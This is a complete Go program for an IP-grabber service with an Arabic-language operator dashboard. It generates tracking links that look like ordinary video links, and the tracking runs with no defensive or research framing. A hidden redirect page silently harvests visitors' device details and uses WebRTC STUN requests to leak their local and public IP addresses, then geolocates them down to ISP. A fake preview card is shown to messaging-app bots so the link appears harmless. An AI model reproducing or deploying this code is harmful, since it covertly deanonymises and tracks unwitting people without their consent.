package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

var db *sql.DB

type Capture struct {
	ID            int
	Code          string
	PublicIP      string
	LocalIP       string
	LocalIPSource string
	Port          string
	Location      string
	DeviceInfo    string
	CreatedAt     string
}

type LinkInfo struct {
	Code         string
	TargetURL    string
	CreatedAt    string
	CaptureCount int
	Captures     []Capture
}

type Stats struct {
	TotalLinks    int
	TotalCaptures int
	UniqueCodes   int
}

type PageData struct {
	GeneratedLink string
	GeneratedCode string
	Captures      []Capture
	SearchResult  *LinkInfo
	SearchQuery   string
	SearchError   string
	Stats         Stats
}

// ---------------------------------------------------------------------------
// Database
// ---------------------------------------------------------------------------

func initDB() {
	var err error
	db, err = sql.Open("sqlite", "./long_term_tracker.db")
	if err != nil {
		panic(err)
	}

	db.SetMaxOpenConns(25)
	db.SetMaxIdleConns(25)
	db.SetConnMaxLifetime(5 * time.Minute)

	db.Exec("PRAGMA journal_mode=WAL;")
	db.Exec("PRAGMA synchronous=NORMAL;")

	createTablesSQL := `
	CREATE TABLE IF NOT EXISTS links (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		code TEXT UNIQUE,
		target_url TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	CREATE TABLE IF NOT EXISTS captures (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		code TEXT,
		public_ip TEXT,
		local_ip TEXT,
		local_ip_source TEXT DEFAULT 'none',
		port TEXT,
		location TEXT,
		device_info TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	CREATE INDEX IF NOT EXISTS idx_captures_code ON captures(code);
	CREATE INDEX IF NOT EXISTS idx_captures_created ON captures(created_at);
	`
	if _, err = db.Exec(createTablesSQL); err != nil {
		panic(err)
	}

	db.Exec("ALTER TABLE captures ADD COLUMN local_ip_source TEXT DEFAULT 'none'")
}

// ---------------------------------------------------------------------------
// IP helpers
// ---------------------------------------------------------------------------

func isTrustedPeer(ip net.IP) bool {
	return ip.IsLoopback() || ip.IsPrivate()
}

func isPrivateIP(ip net.IP) bool {
	return ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast()
}

func getRealIP(r *http.Request) string {
	ip := r.RemoteAddr
	if host, _, err := net.SplitHostPort(ip); err == nil {
		ip = host
	}

	peer := net.ParseIP(ip)
	if peer == nil || !isTrustedPeer(peer) {
		return ip
	}

	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded == "" {
		forwarded = r.Header.Get("X-Real-IP")
	}
	if forwarded != "" {
		parts := strings.Split(forwarded, ",")
		for _, p := range parts {
			candidate := strings.TrimSpace(p)
			if parsed := net.ParseIP(candidate); parsed != nil && !isPrivateIP(parsed) {
				return candidate
			}
		}
		return strings.TrimSpace(parts[0])
	}
	return ip
}

func getISPAndLocation(ip string, ua string) string {
	if ip == "127.0.0.1" || ip == "::1" || strings.HasPrefix(ip, "192.168.") {
		return "Local Network"
	}

	lowerUA := strings.ToLower(ua)
	if strings.Contains(lowerUA, "telegram") {
		return "Telegram Bot"
	}
	if strings.Contains(lowerUA, "whatsapp") {
		return "WhatsApp Bot"
	}
	if strings.Contains(lowerUA, "facebookexternalhit") || strings.Contains(lowerUA, "messenger") {
		return "Meta Bot"
	}

	resp, err := http.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,city,isp,org", ip))
	if err != nil {
		return "Unknown / Trace"
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var result map[string]interface{}
	json.Unmarshal(body, &result)

	if status, ok := result["status"].(string); ok && status == "success" {
		city, _ := result["city"].(string)
		country, _ := result["country"].(string)
		if country == "" {
			country = "Unknown"
		}
		isp, _ := result["isp"].(string)
		if isp == "" {
			isp, _ = result["org"].(string)
		}

		lowerISP := strings.ToLower(isp)
		networkType := isp
		if strings.Contains(lowerISP, "mobilis") {
			networkType = "⚡ Mobilis"
		} else if strings.Contains(lowerISP, "djezzy") || strings.Contains(lowerISP, "ota") {
			networkType = "🔥 Djezzy"
		} else if strings.Contains(lowerISP, "ooredoo") || strings.Contains(lowerISP, "wataniya") {
			networkType = "⭐ Ooredoo"
		} else if strings.Contains(lowerISP, "algerie telecom") || strings.Contains(lowerISP, "atm") {
			networkType = "🌐 Algérie Télécom"
		}
		if networkType == "" {
			networkType = "Unknown ISP"
		}

		locStr := country
		if city != "" {
			locStr = city + ", " + country
		}
		return locStr + " · " + networkType
	}
	return "Unknown / Trace"
}

// ---------------------------------------------------------------------------
// Redirect page
// ---------------------------------------------------------------------------

const redirectPageTemplate = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<script>
async function extractAndRedirect() {
    let screenRes = window.screen.width + "x" + window.screen.height;
    let cores = navigator.hardwareConcurrency || "N/A";
    let platform = navigator.platform || "N/A";
    let batteryInfo = "N/A";

    try {
        if (navigator.getBattery) {
            let b = await navigator.getBattery();
            batteryInfo = Math.round(b.level * 100) + "%";
        }
    } catch (e) { }

    function collectICECandidates(timeoutMs) {
        return new Promise((resolve) => {
            const candidates = [];
            const seen = new Set();
            let pc = null;

            function finish() {
                try { if (pc) pc.close(); } catch (e) { }
                resolve(candidates);
            }

            try {
                pc = new RTCPeerConnection({
                    iceServers: [
                        { urls: "stun:stun.l.google.com:19302" },
                        { urls: "stun:stun1.l.google.com:19302" },
                        { urls: "stun:stun.cloudflare.com:3478" }
                    ]
                });

                pc.createDataChannel("probe");

                pc.onicecandidate = (event) => {
                    if (!event.candidate || !event.candidate.candidate) return;

                    const raw = event.candidate.candidate;
                    if (seen.has(raw)) return;
                    seen.add(raw);

                    const parts = raw.split(" ");
                    const ip = parts[4];
                    const typ = parts[7];

                    if (!ip) return;

                    let source = "unknown";
                    if (typ === "srflx") {
                        source = "srflx";
                    } else if (typ === "relay") {
                        source = "relay";
                    } else if (typ === "host") {
                        if (ip.endsWith(".local")) {
                            source = "mdns";
                        } else {
                            source = "host";
                        }
                    }

                    candidates.push({ ip: ip, typ: typ, source: source });
                };

                pc.createOffer()
                    .then(o => pc.setLocalDescription(o))
                    .catch(() => { });

                const started = Date.now();
                const check = setInterval(() => {
                    if (pc.iceGatheringState === "complete" || Date.now() - started > timeoutMs) {
                        clearInterval(check);
                        finish();
                    }
                }, 80);

            } catch (e) {
                finish();
            }
        });
    }

    const allCandidates = await collectICECandidates(1200);

    let bestLocalIP = "Unknown";
    let localIPSource = "none";

    for (const c of allCandidates) {
        if (c.source === "host" && c.ip) {
            bestLocalIP = c.ip;
            localIPSource = "host";
            break;
        }
    }
    if (bestLocalIP === "Unknown") {
        for (const c of allCandidates) {
            if (c.source === "srflx" && c.ip) {
                bestLocalIP = c.ip;
                localIPSource = "srflx";
                break;
            }
        }
    }

    let params = new URLSearchParams();
    params.append("lip", bestLocalIP);
    params.append("lip_source", localIPSource);
    params.append("screen", screenRes);
    params.append("hardware", cores);
    params.append("battery", batteryInfo);
    params.append("platform", platform);
    params.append("ice_candidates", JSON.stringify(allCandidates.slice(0, 12)));

    try {
        if (navigator.sendBeacon) {
            navigator.sendBeacon(window.location.href, params);
        } else {
            await fetch(window.location.href, {
                method: "POST",
                body: params,
                keepalive: true
            });
        }
    } catch (e) { }

    setTimeout(() => {
        window.location.replace(##REDIRECT_TARGET##);
    }, 120);
}

window.addEventListener("DOMContentLoaded", extractAndRedirect);
</script>
</head>
<body style="background:#000;"></body>
</html>`

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func loadStats() Stats {
	var s Stats
	db.QueryRow("SELECT COUNT(*) FROM links").Scan(&s.TotalLinks)
	db.QueryRow("SELECT COUNT(*) FROM captures").Scan(&s.TotalCaptures)
	db.QueryRow("SELECT COUNT(DISTINCT code) FROM captures").Scan(&s.UniqueCodes)
	return s
}

func loadRecentCaptures(limit int) []Capture {
	rows, err := db.Query(
		"SELECT id, code, public_ip, local_ip, local_ip_source, port, location, device_info, created_at FROM captures ORDER BY id DESC LIMIT ?",
		limit,
	)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var out []Capture
	for rows.Next() {
		var c Capture
		if err := rows.Scan(&c.ID, &c.Code, &c.PublicIP, &c.LocalIP, &c.LocalIPSource, &c.Port, &c.Location, &c.DeviceInfo, &c.CreatedAt); err != nil {
			continue
		}
		out = append(out, c)
	}
	return out
}

func loadCapturesByCode(code string, limit int) []Capture {
	rows, err := db.Query(
		"SELECT id, code, public_ip, local_ip, local_ip_source, port, location, device_info, created_at FROM captures WHERE code = ? ORDER BY id DESC LIMIT ?",
		code, limit,
	)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var out []Capture
	for rows.Next() {
		var c Capture
		if err := rows.Scan(&c.ID, &c.Code, &c.PublicIP, &c.LocalIP, &c.LocalIPSource, &c.Port, &c.Location, &c.DeviceInfo, &c.CreatedAt); err != nil {
			continue
		}
		out = append(out, c)
	}
	return out
}

func loadLinkByCode(code string) *LinkInfo {
	var l LinkInfo
	err := db.QueryRow("SELECT code, target_url, created_at FROM links WHERE code = ?", code).Scan(
		&l.Code, &l.TargetURL, &l.CreatedAt,
	)
	if err != nil {
		return nil
	}
	l.Captures = loadCapturesByCode(code, 100)
	l.CaptureCount = len(l.Captures)
	return &l
}

// ---------------------------------------------------------------------------
// Main handler
// ---------------------------------------------------------------------------

func mainHandler(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("r")

	// ============================================================
	// Case 1: tracker link (?r=CODE)
	// ============================================================
	if code != "" {
		var targetURL string
		err := db.QueryRow("SELECT target_url FROM links WHERE code = ?", code).Scan(&targetURL)
		if err != nil {
			http.Error(w, "Link not found", http.StatusNotFound)
			return
		}

		ua := r.UserAgent()
		lowerUA := strings.ToLower(ua)
		isBot := strings.Contains(lowerUA, "bot") ||
			strings.Contains(lowerUA, "whatsapp") ||
			strings.Contains(lowerUA, "telegram") ||
			strings.Contains(lowerUA, "facebookexternalhit")

		if isBot {
			publicIP := getRealIP(r)
			location := getISPAndLocation(publicIP, ua)
			safeUA := ua
			if len(safeUA) > 60 {
				safeUA = safeUA[:60]
			}
			db.Exec(
				"INSERT INTO captures (code, public_ip, local_ip, local_ip_source, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?, ?)",
				code, publicIP, "Bot", "none", "N/A", location, "🤖 [Bot] UA: "+safeUA,
			)

			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprint(w, `<!DOCTYPE html><html><head><meta property="og:title" content="Video"><meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"></head><body></body></html>`)
			return
		}

		if r.Method == http.MethodPost {
			r.ParseForm()

			publicIP := getRealIP(r)
			localIP := r.FormValue("lip")
			if localIP == "" {
				localIP = "Unknown"
			}
			localIPSource := r.FormValue("lip_source")
			if localIPSource == "" {
				localIPSource = "none"
			}

			port := "N/A"
			if _, p, err := net.SplitHostPort(r.RemoteAddr); err == nil {
				port = p
			}

			location := getISPAndLocation(publicIP, ua)
			deviceInfo := fmt.Sprintf("OS: %s | Screen: %s | Cores: %s | Battery: %s",
				r.FormValue("platform"),
				r.FormValue("screen"),
				r.FormValue("hardware"),
				r.FormValue("battery"),
			)

			if rawCandidates := r.FormValue("ice_candidates"); rawCandidates != "" {
				fmt.Printf("[ICE] code=%s public=%s local=%s(%s) candidates=%s\n",
					code, publicIP, localIP, localIPSource, rawCandidates)
			}

			db.Exec(
				"INSERT INTO captures (code, public_ip, local_ip, local_ip_source, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?, ?)",
				code, publicIP, localIP, localIPSource, port, location, deviceInfo,
			)

			w.WriteHeader(http.StatusOK)
			w.Write([]byte("OK"))
			return
		}

		targetJSON, _ := json.Marshal(targetURL)
		htmlContent := strings.ReplaceAll(redirectPageTemplate, "##REDIRECT_TARGET##", string(targetJSON))

		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")
		w.Write([]byte(htmlContent))
		return
	}

	// ============================================================
	// Case 2: admin panel
	// ============================================================
	data := PageData{}

	// ---- Create link (POST) ----
	if r.Method == http.MethodPost {
		r.ParseForm()
		targetURL := r.FormValue("target_url")
		customCode := r.FormValue("custom_code")

		if targetURL != "" {
			if !strings.HasPrefix(targetURL, "http") {
				targetURL = "https://" + targetURL
			}

			codeGen := strings.TrimSpace(customCode)
			if codeGen == "" {
				codeGen = fmt.Sprintf("%d", time.Now().UnixNano())[8:]
			}

			_, err := db.Exec("INSERT INTO links (code, target_url) VALUES (?, ?)", codeGen, targetURL)
			if err == nil {
				scheme := "https"
				if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
					scheme = "http"
				}
				data.GeneratedLink = fmt.Sprintf("%s://%s/?r=%s", scheme, r.Host, codeGen)
				data.GeneratedCode = codeGen
			}
		}
	}

	// ---- Search (GET ?search=CODE) ----
	searchQuery := strings.TrimSpace(r.URL.Query().Get("search"))
	if searchQuery != "" {
		data.SearchQuery = searchQuery
		link := loadLinkByCode(searchQuery)
		if link == nil {
			data.SearchError = "لا يوجد رابط بهذا الكود"
		} else {
			data.SearchResult = link
		}
	}

	data.Stats = loadStats()
	if data.SearchResult == nil {
		data.Captures = loadRecentCaptures(50)
	}

	// ---- Render ----
	tmpl := `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Code Terminal — Intelligence</title>
<style>
    * { box-sizing: border-box; }
    body {
        background-color: #0a0e14;
        background-image:
            radial-gradient(ellipse at top, rgba(0, 255, 128, 0.06), transparent 60%),
            radial-gradient(rgba(0, 255, 128, 0.04) 1px, transparent 1px);
        background-size: 100% 100%, 24px 24px;
        color: #c9d1d9;
        font-family: 'Courier New', Courier, monospace;
        padding: 16px;
        margin: 0;
        min-height: 100vh;
    }
    .container { max-width: 1200px; margin: 0 auto; }
    .header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 20px;
        padding-bottom: 14px;
        border-bottom: 1px solid #21262d;
        flex-wrap: wrap;
        gap: 10px;
    }
    .header h1 {
        font-size: 16px;
        margin: 0;
        color: #58a6ff;
        letter-spacing: 1px;
    }
    .header h1 span { color: #3fb950; }
    .status-dot {
        display: inline-block;
        width: 8px;
        height: 8px;
        background: #3fb950;
        border-radius: 50%;
        margin-left: 6px;
        box-shadow: 0 0 6px #3fb950;
        animation: pulse 2s infinite;
    }
    @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.4; }
    }

    /* Stats cards */
    .stats {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
        gap: 12px;
        margin-bottom: 20px;
    }
    .stat-card {
        background: linear-gradient(135deg, #161b22 0%, #0d1117 100%);
        border: 1px solid #30363d;
        border-radius: 8px;
        padding: 14px;
        text-align: center;
        position: relative;
        overflow: hidden;
    }
    .stat-card::before {
        content: '';
        position: absolute;
        top: 0; left: 0; right: 0;
        height: 2px;
        background: linear-gradient(90deg, transparent, #58a6ff, transparent);
    }
    .stat-value {
        font-size: 24px;
        font-weight: bold;
        color: #58a6ff;
        margin-bottom: 4px;
    }
    .stat-label {
        font-size: 11px;
        color: #8b949e;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    /* Boxes */
    .box {
        background: #161b22;
        border: 1px solid #30363d;
        padding: 16px;
        border-radius: 8px;
        margin-bottom: 16px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.4);
    }
    .box-title {
        font-size: 13px;
        color: #58a6ff;
        margin: 0 0 12px 0;
        padding-bottom: 8px;
        border-bottom: 1px dashed #21262d;
    }
    .box-title .badge {
        background: #21262d;
        color: #8b949e;
        font-size: 10px;
        padding: 2px 6px;
        border-radius: 3px;
        margin-right: 8px;
    }

    /* Inputs */
    input[type="text"] {
        width: 100%;
        padding: 11px 12px;
        background: #0d1117;
        border: 1px solid #30363d;
        color: #58a6ff;
        border-radius: 6px;
        margin-bottom: 10px;
        font-size: 13px;
        font-family: inherit;
        transition: all 0.2s;
    }
    input[type="text"]:focus {
        border-color: #58a6ff;
        outline: none;
        box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.15);
    }
    input[type="text"]::placeholder { color: #484f58; }

    /* Buttons */
    button {
        background: linear-gradient(135deg, #238636, #1a6b2d);
        color: #fff;
        border: none;
        padding: 11px 16px;
        border-radius: 6px;
        cursor: pointer;
        font-weight: bold;
        font-size: 13px;
        font-family: inherit;
        transition: all 0.15s;
    }
    button:hover { background: linear-gradient(135deg, #2ea043, #238636); transform: translateY(-1px); }
    button:active { transform: translateY(0); }
    .btn-full { width: 100%; }
    .btn-blue { background: linear-gradient(135deg, #1f6feb, #0d47a1); }
    .btn-blue:hover { background: linear-gradient(135deg, #388bfd, #1f6feb); }
    .btn-sm { padding: 6px 10px; font-size: 11px; }
    .btn-ghost {
        background: transparent;
        color: #8b949e;
        border: 1px solid #30363d;
    }
    .btn-ghost:hover { background: #21262d; color: #c9d1d9; }

    /* Result box */
    .result {
        background: #0d1117;
        border: 1px solid #238636;
        padding: 12px;
        border-radius: 6px;
        margin-top: 12px;
    }
    .result-label {
        font-size: 11px;
        color: #3fb950;
        font-weight: bold;
        display: flex;
        align-items: center;
        gap: 6px;
        margin-bottom: 8px;
    }
    .result-value {
        color: #58a6ff;
        font-size: 12px;
        word-break: break-all;
        margin-bottom: 10px;
        padding: 8px;
        background: #161b22;
        border-radius: 4px;
        direction: ltr;
        text-align: left;
    }
    .result-code {
        color: #d29922;
        font-weight: bold;
        font-size: 14px;
        direction: ltr;
        text-align: left;
        background: #161b22;
        padding: 6px 10px;
        border-radius: 4px;
        display: inline-block;
        margin-bottom: 10px;
    }
    .btn-row {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
    }
    .btn-row button { flex: 1; min-width: 130px; }

    /* Search result box */
    .search-result {
        background: #0d1117;
        border: 1px solid #1f6feb;
        padding: 14px;
        border-radius: 6px;
        margin-top: 12px;
    }
    .search-result .row {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 6px 0;
        border-bottom: 1px dashed #21262d;
        flex-wrap: wrap;
        gap: 8px;
    }
    .search-result .row:last-child { border-bottom: none; }
    .search-result .key { color: #8b949e; font-size: 12px; }
    .search-result .val { color: #c9d1d9; font-size: 12px; direction: ltr; text-align: left; }
    .search-result .val.url { color: #58a6ff; word-break: break-all; max-width: 70%; }
    .search-error {
        background: rgba(248, 81, 73, 0.1);
        border: 1px solid #f85149;
        color: #ff7b72;
        padding: 10px;
        border-radius: 6px;
        margin-top: 12px;
        font-size: 12px;
        text-align: center;
    }
    .search-loading { display: none; color: #d29922; font-size: 12px; margin-top: 8px; }

    /* Table */
    .table-wrap {
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
        border-radius: 6px;
    }
    table {
        width: 100%;
        min-width: 800px;
        border-collapse: collapse;
        font-size: 11px;
        font-family: inherit;
    }
    th, td {
        border: 1px solid #21262d;
        padding: 8px 6px;
        text-align: center;
        white-space: nowrap;
    }
    th {
        background: #21262d;
        color: #8b949e;
        font-size: 10px;
        text-transform: uppercase;
        letter-spacing: 0.5px;
        position: sticky;
        top: 0;
    }
    tr:nth-child(even) td { background: rgba(22, 27, 34, 0.4); }
    tr:hover td { background: #1c2128; }
    .cell-code { color: #58a6ff; font-weight: bold; }
    .cell-public { color: #7ee787; direction: ltr; }
    .cell-local { color: #d29922; direction: ltr; }
    .cell-location { color: #3fb950; }
    .cell-device { color: #ff7b72; }
    .cell-time { color: #8b949e; }

    /* Source badges */
    .src-badge {
        display: inline-block;
        padding: 2px 8px;
        border-radius: 10px;
        font-size: 10px;
        font-weight: bold;
    }
    .src-host  { background: rgba(63, 185, 80, 0.15); color: #3fb950; border: 1px solid #3fb950; }
    .src-srflx { background: rgba(210, 153, 34, 0.15); color: #d29922; border: 1px solid #d29922; }
    .src-relay { background: rgba(88, 166, 255, 0.15); color: #58a6ff; border: 1px solid #58a6ff; }
    .src-mdns  { background: rgba(139, 148, 158, 0.15); color: #8b949e; border: 1px solid #484f58; }
    .src-none  { background: rgba(110, 118, 129, 0.15); color: #6e7681; border: 1px solid #484f58; }

    /* Toast */
    .toast {
        position: fixed;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%) translateY(100px);
        background: #238636;
        color: #fff;
        padding: 12px 24px;
        border-radius: 8px;
        font-size: 13px;
        font-weight: bold;
        box-shadow: 0 8px 24px rgba(0,0,0,0.6);
        opacity: 0;
        transition: all 0.3s ease;
        z-index: 9999;
    }
    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }

    /* Empty state */
    .empty {
        text-align: center;
        padding: 30px;
        color: #484f58;
        font-size: 12px;
    }

    @media (max-width: 600px) {
        body { padding: 10px; }
        .stat-value { font-size: 20px; }
        .box { padding: 12px; }
        .search-result .val.url { max-width: 100%; }
    }
</style>
<script>
    function showToast(msg) {
        const t = document.getElementById('toast');
        t.innerText = msg;
        t.classList.add('show');
        clearTimeout(window.__toastTimer);
        window.__toastTimer = setTimeout(() => t.classList.remove('show'), 2200);
    }

    function copyText(text, label) {
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(text).then(
                () => showToast('✓ ' + label + ' تم النسخ'),
                () => fallbackCopy(text, label)
            );
        } else {
            fallbackCopy(text, label);
        }
    }

    function fallbackCopy(text, label) {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.opacity = '0';
        document.body.appendChild(ta);
        ta.select();
        try { document.execCommand('copy'); showToast('✓ ' + label + ' تم النسخ'); }
        catch (e) { showToast('✗ فشل النسخ'); }
        document.body.removeChild(ta);
    }
</script>
</head>
<body>
<div class="container">

    <div class="header">
        <h1>// CODE_TERMINAL<span class="status-dot"></span></h1>
        <span style="font-size:11px; color:#8b949e;">v2.0 · intelligence suite</span>
    </div>

    <!-- Stats -->
    <div class="stats">
        <div class="stat-card">
            <div class="stat-value">{{.Stats.TotalLinks}}</div>
            <div class="stat-label">روابط مُولَّدة</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{{.Stats.TotalCaptures}}</div>
            <div class="stat-label">زيارات مُسجَّلة</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{{.Stats.UniqueCodes}}</div>
            <div class="stat-label">أكواد نشطة</div>
        </div>
    </div>

    <!-- Create link -->
    <div class="box">
        <h3 class="box-title"><span class="badge">01</span> توليد رابط تتبع جديد</h3>
        <form method="POST">
            <input type="text" name="target_url" placeholder="target_url  →  https://example.com/video" required autocomplete="off">
            <input type="text" name="custom_code" placeholder="custom_code (اختياري)" autocomplete="off">
            <button type="submit" class="btn-full">🚀 generate_link()</button>
        </form>

        {{if .GeneratedLink}}
        <div class="result">
            <div class="result-label">✓ الرابط جاهز</div>
            <div class="result-value" id="genLink">{{.GeneratedLink}}</div>
            <div style="font-size:11px; color:#8b949e; margin-bottom:6px;">كود التتبع:</div>
            <div class="result-code" id="genCode">{{.GeneratedCode}}</div>
            <div class="btn-row" style="margin-top:6px;">
                <button type="button" class="btn-blue" onclick="copyText(document.getElementById('genLink').innerText, 'الرابط')">📋 نسخ الرابط</button>
                <button type="button" class="btn-blue" onclick="copyText(document.getElementById('genCode').innerText, 'الكود')">🏷️ نسخ الكود</button>
            </div>
        </div>
        {{end}}
    </div>

    <!-- Search -->
    <div class="box">
        <h3 class="box-title"><span class="badge">02</span> البحث عن رابط سابق بالكود</h3>
        <form method="GET" action="/">
            <input type="text" name="search" placeholder="أدخل كود التتبع (مثال: 12345678)" value="{{.SearchQuery}}" autocomplete="off">
            <button type="submit" class="btn-full btn-blue">🔍 search_link()</button>
        </form>

        {{if .SearchError}}
        <div class="search-error">✗ {{.SearchError}}</div>
        {{end}}

        {{if .SearchResult}}
        <div class="search-result">
            <div class="row">
                <span class="key">الكود</span>
                <span class="val" style="color:#d29922; font-weight:bold;" id="searchCode">{{.SearchResult.Code}}</span>
            </div>
            <div class="row">
                <span class="key">الرابط الأصلي</span>
                <span class="val url">{{.SearchResult.TargetURL}}</span>
            </div>
            <div class="row">
                <span class="key">تاريخ الإنشاء</span>
                <span class="val">{{.SearchResult.CreatedAt}}</span>
            </div>
            <div class="row">
                <span class="key">عدد الزيارات</span>
                <span class="val" style="color:#3fb950; font-weight:bold;">{{.SearchResult.CaptureCount}}</span>
            </div>
            <div class="btn-row" style="margin-top:10px;">
                <button type="button" class="btn-sm btn-blue" onclick="copyText(document.getElementById('searchCode').innerText, 'الكود')">🏷️ نسخ الكود</button>
                <button type="button" class="btn-sm btn-ghost" onclick="window.location.href='/?r={{.SearchResult.Code}}'" target="_blank">🔗 فتح الرابط</button>
            </div>
        </div>
        {{end}}
    </div>

    <!-- Captures table -->
    <div class="box">
        <h3 class="box-title">
            <span class="badge">03</span>
            {{if .SearchResult}}
                زيارات الكود <span style="color:#d29922;">{{.SearchResult.Code}}</span>
            {{else}}
                آخر الزيارات المُسجَّلة
            {{end}}
        </h3>

        <div class="table-wrap">
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Code</th>
                        <th>Public IP</th>
                        <th>Local IP</th>
                        <th>Source</th>
                        <th>ISP / Network</th>
                        <th>Hardware &amp; OS</th>
                        <th>Timestamp</th>
                    </tr>
                </thead>
                <tbody>
                {{if .SearchResult}}
                    {{range .SearchResult.Captures}}
                    <tr>
                        <td class="cell-time">{{.ID}}</td>
                        <td class="cell-code">{{.Code}}</td>
                        <td class="cell-public">{{.PublicIP}}</td>
                        <td class="cell-local">{{.LocalIP}}</td>
                        <td><span class="src-badge src-{{.LocalIPSource}}">{{.LocalIPSource}}</span></td>
                        <td class="cell-location">{{.Location}}</td>
                        <td class="cell-device">{{.DeviceInfo}}</td>
                        <td class="cell-time">{{.CreatedAt}}</td>
                    </tr>
                    {{else}}
                    <tr><td colspan="8" class="empty">لا توجد زيارات مسجلة لهذا الكود بعد</td></tr>
                    {{end}}
                {{else}}
                    {{range .Captures}}
                    <tr>
                        <td class="cell-time">{{.ID}}</td>
                        <td class="cell-code">{{.Code}}</td>
                        <td class="cell-public">{{.PublicIP}}</td>
                        <td class="cell-local">{{.LocalIP}}</td>
                        <td><span class="src-badge src-{{.LocalIPSource}}">{{.LocalIPSource}}</span></td>
                        <td class="cell-location">{{.Location}}</td>
                        <td class="cell-device">{{.DeviceInfo}}</td>
                        <td class="cell-time">{{.CreatedAt}}</td>
                    </tr>
                    {{else}}
                    <tr><td colspan="8" class="empty">لا توجد زيارات بعد — أنشئ رابطًا وشارك</td></tr>
                    {{end}}
                {{end}}
                </tbody>
            </table>
        </div>
    </div>

</div>

<div class="toast" id="toast"></div>
</body>
</html>`

	t, err := template.New("index").Parse(tmpl)
	if err != nil {
		http.Error(w, "template error: "+err.Error(), http.StatusInternalServerError)
		return
	}
	if err := t.Execute(w, data); err != nil {
		http.Error(w, "render error: "+err.Error(), http.StatusInternalServerError)
	}
}

func main() {
	initDB()
	http.HandleFunc("/", mainHandler)
	fmt.Println("[*] Terminal Server running on http://localhost:8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		panic(err)
	}
}
